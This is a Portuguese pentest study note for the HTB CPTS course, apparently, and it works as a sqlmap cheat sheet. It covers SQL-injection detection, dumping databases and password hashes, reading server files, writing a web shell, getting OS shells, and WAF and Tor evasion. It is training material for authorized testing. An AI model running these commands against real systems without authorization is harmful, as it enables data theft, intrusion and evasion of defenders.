---
tema: Web / Injeção
tópico: SQLMap Essentials — automação de exploração SQLi
tags: [htb, cpts, sqlmap, sqli, automação, web]
dificuldade: easy
---

# 🤖 CPTS 18 — SQLMap Essentials

> [!info] Objetivo
> Automatizar o que a exploração manual ([[CPTS 17 - SQL Injection Fundamentals]]) já provou: identificar o tipo de injeção, enumerar bancos/tabelas, dumpar dados, ler e gravar arquivos e, quando o privilégio permite, obter um shell de SO via SQLi.
> Regra prática: **entenda o payload à mão antes de deixar o sqlmap rodar**. Ferramenta cega gera falso positivo e derruba produção.

---

## 🎯 Quando usar

| Situação | Por que sqlmap |
|----------|----------------|
| Ponto injetável já confirmado manualmente | Escala extração de dados rapidamente |
| Blind boolean/time | Perguntas repetitivas são inviáveis à mão |
| Request com cookie/JSON/CSRF | `-r` replica o request exato |
| Precisa de shell de SO via SQLi | `--os-shell`/`--os-cmd` cuidam da cadeia |
| WAF bloqueando | `--tamper` automatiza os bypasses |
| Site enorme com muitos parâmetros | `--forms`, `--crawl` |
| Nunca | Em produção sem autorização explícita (`--dump-all` derruba serviço) |

---

## 🧰 Ferramentas

```bash
# Instalação via pacote (Kali já traz) ou do repositório oficial
sudo pacman -S --needed sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
python3 sqlmap.py --version
```

| Item | Uso |
|------|-----|
| `sqlmap` | Motor de detecção e exploração |
| Burp Suite | Capturar o request cru (cookie, headers, JSON) |
| `--proxy` + Burp | Enxergar o que o sqlmap envia e ajustar |
| Session file (`~/.local/share/sqlmap/output/` ou `--output-dir`) | Guarda resultado e permite retomar |

---

## 🚪 Alvo: escolha o jeito certo de apontar

| Forma | Quando |
|-------|--------|
| `-u "<URL>"` | GET simples com parâmetros na query |
| `--data="a=1&b=2"` | POST simples |
| `-r req.txt` | **Melhor** para casos reais: preserva cookie, método, headers e corpo |
| `--cookie="PHPSESSID=..."` | Autenticação por cookie junto com `-u`/`--data` |
| `-H "Header: valor"` | Headers extras |
| `--method=PUT` | Forçar método |
| `--forms` | Parsear forms HTML automaticamente |
| `--crawl=2` | Descobrir URLs e testá-las |
| `-m urls.txt` | Testar uma lista de alvos (bulk) |
| `-l burp.log` | Usar log do proxy (Burp/WebScarab) |
| `-g "dork"` | Google dork (raramente útil em engajamento) |

```bash
# GET com cookie
sqlmap -u "http://<IP>/product.php?id=1" --cookie="PHPSESSID=abc123" --batch

# Request salvo do Burp: clique direito → Save item
sqlmap -r req.txt --batch
```

```http
# Exemplo de req.txt (POST com JSON) — preservado exatamente
POST /api/user HTTP/1.1
Host: <IP>
Content-Type: application/json
Cookie: session=abc123

{"id":"1","role":"user"}
```

```bash
# JSON body sem salvar request
sqlmap -u "http://<IP>/api/user" --data='{"id":"1"}' \
  --headers="Content-Type: application/json" --cookie="session=abc123" --batch
```

> [!tip] Parâmetro específico
> `-p id` restringe o teste a um parâmetro. Sem isso o sqlmap testa tudo e demora. Para excluir: `--skip=csrf,token`.

---

## 🔬 Detecção e ajuste fino

| Flag | O que faz |
|------|-----------|
| `--batch` | Assume "yes" em todas as perguntas (não interativo) |
| `-p PARAM` | Testa apenas esse parâmetro |
| `--dbms=mysql` | Pula heurística e vai direto ao banco certo (mais rápido, menos ruído) |
| `--os=linux` | Assume SO do back-end |
| `--level=1..5` | 1 = só GET/POST óbvios; 5 = headers, cookies, testes pesados |
| `--risk=1..3` | 3 inclui payloads **que alteram dados** (OR-based, heavy time) |
| `--technique=BEUSTQ` | Escolhe técnicas: B boolean, E error, U union, S stacked, T time, Q inline |
| `--prefix` / `--suffix` | Envolve o payload para encaixar na query original |
| `--string=...` | Texto que aparece **somente** em resposta verdadeira |
| `--not-string=...` | Texto que aparece somente em resposta falsa |
| `--code=200` | Considera sucesso apenas esse status HTTP |
| `--titles` | Usa o `<title>` como critério de comparação |
| `--parse-errors` | Mostra mensagens de erro do banco (ajuda a diagnosticar) |
| `-v 3` / `-v 6` | Verbosidade: 3 mostra payloads; 6 mostra requests HTTP completos |
| `--flush-session` | Descarta cache e refaz a detecção do zero |
| `--fresh-queries` | Ignora resultados em cache para as queries de enumeração |

```bash
# Detecção enxuta e rápida
sqlmap -r req.txt --batch --dbms=mysql --level=3 --risk=2 -p id -v 3

# Quando só o tempo responde (WAF bloqueia erro/union)
sqlmap -r req.txt --technique=T --time-sec=3 --batch

# Falso positivo por página dinâmica: fixar o critério
sqlmap -u "http://<IP>/p.php?id=1" --string="Bem-vindo" --batch
```

> [!warning] `--level=5 --risk=3`
> Não use como default. Além de lento e barulhento, `--risk=3` dispara payloads OR-based e time pesados que podem alterar dados ou derrubar a aplicação.

---

## 📚 Enumeração de dados

```bash
# Contexto
sqlmap -r req.txt --batch --current-db --current-user --hostname --banner --is-dba

# Bancos → tabelas → colunas → dump
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt -D <BANCO> --tables
sqlmap -r req.txt -D <BANCO> -T users --columns
sqlmap -r req.txt -D <BANCO> -T users -C username,password --dump

# Tudo do banco (evita bancos de sistema)
sqlmap -r req.txt --batch -D <BANCO> --dump-all --exclude-sysdbs

# Schema completo em um passo
sqlmap -r req.txt --batch --schema -D <BANCO>
```

| Flag | O que faz |
|------|-----------|
| `--dbs` | Lista bancos |
| `--tables` / `--columns` | Tabelas / colunas (com `-D`, `-T`) |
| `--dump` | Extrai linhas da tabela |
| `--dump-all --exclude-sysdbs` | Dump completo ignorando `information_schema` etc. |
| `--count` | Conta linhas |
| `--where="id>100"` | Filtra o dump |
| `--start=1 --stop=50` | Pagina o dump (tabelas grandes) |
| `--search -C pass` | Procura colunas por nome em todos os bancos |
| `--search -T user` | Procura tabelas por nome |
| `-C user,pass --dump` | Dumpar apenas essas colunas |
| `--users` / `--passwords` | Usuários do SGBD e hashes |
| `--privileges` / `--roles` | Privilégios e papéis |
| `--threads=10` | Paralelismo na extração |
| `--hex` | Recupera dados em hex (evita problemas de charset em blind) |
| `--no-cast` | Desabilita CAST — útil em DBs exóticos |

```bash
# Hashes do MySQL + ataque offline depois
sqlmap -r req.txt --batch --passwords
# Guardar em hashes.txt e quebrar com hashcat/john ([[CPTS 10 - Password Attacks]])
```

---

## 🗄️ SQL shell e queries arbitrárias

```bash
sqlmap -r req.txt --sql-shell --batch        # prompt interativo
sqlmap -r req.txt --sql-query="SELECT @@version" --batch
sqlmap -r req.txt --sql-query="SELECT LOAD_FILE('/etc/passwd')" --batch
sqlmap -r req.txt --sql-file=queries.sql --batch

# Gravar resultado em CSV
sqlmap -r req.txt -D <BANCO> -T users --dump --csv --batch
```

| Flag | O que faz |
|------|-----------|
| `--sql-shell` | Shell interativo de SQL (equivalente ao `--os-shell` para o banco) |
| `--sql-query` | Query única |
| `--sql-file` | Arquivo com várias queries |
| `--csv` | Exporta em CSV no diretório de output |
| `--second-url` / `--second-req` | Trata injeção de **segunda ordem** (dado gravado e lido em outra página) |

---

## 📂 Arquivos, OS shell e RCE

```bash
# Ler arquivo do servidor (requer privilégio de leitura de arquivo)
sqlmap -r req.txt --file-read="/etc/passwd" --batch
sqlmap -r req.txt --file-read="/var/www/html/config.php" --batch

# Gravar arquivo — dois passos: origem local e destino remoto
sqlmap -r req.txt --file-write=./shell.php --file-dest="/var/www/html/shell.php" --batch
```

```bash
# Shell de SO (usa UNION/stacked para escrever um web shell + um shell para upload)
sqlmap -r req.txt --os-shell --batch

# Comando único
sqlmap -r req.txt --os-cmd="id" --batch

# Metasploit/ SMB relay para shell reverso (alvos internos com acesso ao seu host)
sqlmap -r req.txt --os-pwn --msf-path=/opt/metasploit
sqlmap -r req.txt --os-smbrelay
```

| Flag | Requisitos |
|------|-----------|
| `--file-read` | Privilégio `FILE`/`BULK` e leitura permitida |
| `--file-write` | Diretório gravável pelo usuário do SGBD (docroot ideal) |
| `--os-shell` | `FILE` + `secure_file_priv` liberado + web root conhecido |
| `--os-cmd` | Mesma cadeia do `--os-shell`, só o comando |
| `--os-pwn` | Requer Metasploit instalado e rota de retorno |

> [!note] Saída do `--os-shell`
> O sqlmap grava dois arquivos no servidor (um para executar comandos, outro para upload/download). Eles **ficam no servidor** — limpe após o engajamento e registre os paths no relatório.

---

## 🛡️ Tamper, WAF e evasão

```bash
sqlmap --list-tampers
sqlmap -r req.txt --tamper=space2comment --batch
sqlmap -r req.txt --tamper=space2comment,between,charencode,randomcase --batch
```

| Tamper | Efeito |
|--------|--------|
| `space2comment` | Troca espaço por `/**/` |
| `space2plus` / `space2hash` | Alternativas de espaço (`+`, `#` + newline) |
| `between` | Troca `>` por `NOT BETWEEN 0 AND` |
| `equaltolike` | Troca `=` por `LIKE` |
| `randomcase` | Aleatoriza o caso das keywords |
| `charencode` / `charunicodeencode` | URL-encode de caracteres |
| `apostrophemask` | Substitui `'` por UTF-8 fullwidth |
| `percentage` | Insere `%` no meio das keywords |
| `modsecurityversioned` / `modsecurityzeroversioned` | Contorna regras do ModSecurity |
| `base64encode` | Codifica o payload em base64 (parâmetros que o app decodifica) |
| `concat2concatws` | Troca `CONCAT()` por `CONCAT_WS()` |
| `xforwardedfor` | Anti-CSRF/anti-IP com `X-Forwarded-For` |

```bash
# Combinar com fragmentação e delay para fugir de rate-limit
sqlmap -r req.txt --tamper=space2comment --chunked --delay=1 --randomize=id --batch
```

| Flag de evasão | O que faz |
|----------------|-----------|
| `--chunked` | Divide o corpo em chunks (bypassa filtros de corpo) |
| `--hpp` | HTTP Parameter Pollution |
| `--randomize=PARAM` | Varia o valor do parâmetro a cada requisição |
| `--delay=1` | 1s entre requisições (rate-limit) |
| `--proxy=http://127.0.0.1:8080` | Passa pelo Burp para inspeção |
| `--proxy="socks5://..."` / `--tor --check-tor` | Anonimização na origem |
| `--random-agent` | UA aleatório (evita bloqueio por assinatura) |
| `--user-agent=...` / `--referer=...` | Falsificar headers específicos |
| `--mobile` | Simula User-Agent mobile (pode desbloquear fluxo) |
| `--safe-url` + `--safe-freq=10` | Acessa URL "inocente" a cada N requests para manter a sessão viva |
| `--csrf-token=csrf&--csrf-url=http://<IP>/form` | Renova token anti-CSRF automaticamente |
| `--eval="import time; x=int(time.time())"` | Calcula valor dinâmico para um parâmetro |

> [!tip] Ordem dos ajustes
> 1) `--random-agent`; 2) `--delay`; 3) `--tamper`; 4) `--chunked`/`--hpp`; 5) `--proxy` do Burp para ver o que ainda passa. Ajuste um por vez.

---

## ⚙️ Performance, sessão e logs

| Flag | O que faz |
|------|-----------|
| `--threads=10` | Threads para extração (default 1 para blind, suba só quando estável) |
| `--timeout=10` | Timeout por requisição |
| `--retries=2` | Retentativas em timeout |
| `--keep-alive` | Reutiliza conexão HTTP |
| `--null-connection` | Recupera dados sem corpo de resposta (economia em blind) |
| `--predict-output` | Chuta caracteres prováveis e reduz requisições |
| `-o` | Liga todas as otimizações |
| `--flush-session` | Zera o cache da sessão (payloads e detecções) |
| `--fresh-queries` | Reexecuta as queries de enumeração |
| `--output-dir=./sqlmap-out` | Define onde salvar |
| `--answers="dump=Y,threads=8"` | Responde perguntas específicas sem `--batch` |
| `-t traces.txt` | Salva o tráfego completo |
| `-s session.sqlite` | Arquivo de sessão customizado |

```bash
# Retomar de onde parou (o session file guarda o que já foi extraído)
ls ~/.local/share/sqlmap/output/<host>/
# log  session.sqlite  target.txt  dump/  ...

# Reexecutar tudo do zero, sem cache
sqlmap -r req.txt --flush-session --fresh-queries --batch
```

---

## 🧩 Fluxo completo de um engajamento

```bash
# 1. Capturar request autenticado no Burp e salvar como req.txt
# 2. Detectar
sqlmap -r req.txt --batch --dbms=mysql --level=3 --risk=2 -v 3
# 3. Contexto e privilégios
sqlmap -r req.txt --batch --current-db --is-dba --users --privileges
# 4. Dados
sqlmap -r req.txt --batch -D <BANCO> --tables
sqlmap -r req.txt --batch -D <BANCO> -T users -C username,password --dump
# 5. Escalar: hashes → crack; FILE → ler config/gravar shell
sqlmap -r req.txt --batch --file-read="/etc/passwd"
sqlmap -r req.txt --batch --file-write=./shell.php --file-dest="/var/www/html/shell.php"
# 6. Interativo só se precisar
sqlmap -r req.txt --sql-shell
```

---

## ⚠️ Pegadinhas

- `--batch` respondendo "yes" para tudo pode aceitar opções agressivas sozinho — combine com `--technique`/`--dbms` para limitar.
- Sem `-p` o sqlmap testa dezenas de parâmetros: lento, barulhento e cheio de falso positivo.
- `--risk=3` inclui payloads OR-based; em banco real isso pode **alterar dados**.
- `--dump-all` em ambiente produtivo derruba o servidor. Peça janela e use `--where`/`--start`/`--stop`.
- Sessão em cache esconde falhas: quando o comportamento muda, `--flush-session`.
- `--os-shell` depende de `secure_file_priv` e docroot: se não tem `FILE`, use `--sql-shell`.
- Ativar `--tor` sem `--check-tor` deixa você sem anonimato achando que tem.
- `--threads` alto em blind time-based gera medições erradas e dados corrompidos no dump.
- Falso positivo de injeção: valide o payload manualmente no Repeater antes de dumpar.
- Deixe `--file-write` para o final: sobrescrever arquivo da aplicação pode quebrar o serviço.

---

## ✅ Checklist rápido

- [ ] Request capturado com cookie/headers/JSON preservados (`-r`)
- [ ] Parâmetro de interesse isolado com `-p`
- [ ] `--dbms` e `--technique` definidos para reduzir ruído
- [ ] Critério de comparação fixado (`--string`/`--code`/`--titles`) se a página for dinâmica
- [ ] Detecção validada manualmente (não só a saída da ferramenta)
- [ ] `--current-db`, `--current-user`, `--is-dba` coletados
- [ ] Bancos/tabelas relevantes listados
- [ ] Dados sensíveis dumpados e salvos com `--csv`/output
- [ ] Privilégio de arquivo avaliado (`--file-read` testado)
- [ ] Bypass de WAF aplicado se necessário (`--tamper`, `--random-agent`, `--delay`)
- [ ] Output, session file e logs preservados como evidência
- [ ] Artefatos gravados no servidor (`--os-shell`) removidos/registrados

---

## 🔗 Relacionado

- [[CPTS 17 - SQL Injection Fundamentals]]
- [[CPTS 10 - Password Attacks]]
- [[CPTS 14 - Using Web Proxies]]
- [[CPTS 15 - Attacking Web Applications with Ffuf]]
- [[Fase 05 - Enumeração Web]]
